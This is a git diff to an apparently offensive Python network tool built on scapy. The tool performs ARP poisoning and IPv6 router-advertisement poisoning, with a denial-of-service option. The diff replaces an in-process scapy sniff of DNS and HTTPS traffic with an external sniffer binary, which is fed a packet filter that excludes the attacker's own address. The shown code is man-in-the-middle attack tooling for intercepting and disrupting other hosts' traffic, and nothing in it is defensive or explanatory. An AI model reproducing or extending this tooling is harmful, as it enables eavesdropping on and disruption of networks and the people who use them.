@@ -1,7 +1,7 @@
 import socket
 import threading
 import time
-
+import signal 
 from scapy.all import ARP, Ether, sendp, sniff
 from scapy.layers.inet6 import (
     ICMPv6EchoRequest,
@@ -118,6 +118,25 @@ def ipv6_poison_service(target_mac):
         safe_send(ra_kill)
         time.sleep(0.1)
 
+def start_sniffer_binary():
+    import subprocess
+    arguments = ["./sniffer"]
+
+    #what a function
+    sniffer_binary = subprocess.Popen(args=arguments, start_new_session=True,stdout=subprocess.PIPE, stdin=subprocess.PIPE, text=True, cwd="modules/binaries")
+    
+    bpf = "not ip6 and not host %s and not port 443\n" % get_ip()
+
+    sniffer_binary.stdin.write(bpf)
+    sniffer_binary.stdin.flush()
+    while not stop_event.is_set(): 
+        time.sleep(2)
+    sniffer_binary.send_signal(signal.SIGINT)
+    out, err = sniffer_binary.communicate()
+    print(out)
+
+
+
 
 def start_arp_poison(target_ip, target_mac, router_ip, attacker_mac, router_mac, dos):
     stop_event.clear()
@@ -149,20 +168,12 @@ def start_arp_poison(target_ip, target_mac, router_ip, attacker_mac, router_mac,
         threads.append(ipv6_thread)
 
     if not dos:
-        from scanner import Scanner
-
-        scanner = Scanner()
-        try:
-            my_ip = get_ip()
-            my_filter = f"not host {my_ip} and (udp port 53 or tcp port 443)"
-        except Exception:
-            my_filter = "(udp port 53 or tcp port 443)"
-
         sniff_thread = threading.Thread(
-            target=lambda: sniff(prn=scanner.process_packet, filter=my_filter, store=0),
+            target=start_sniffer_binary,
             daemon=True,
         )
         threads.append(sniff_thread)
 
     for thread in threads:
         thread.start()
+    return threads
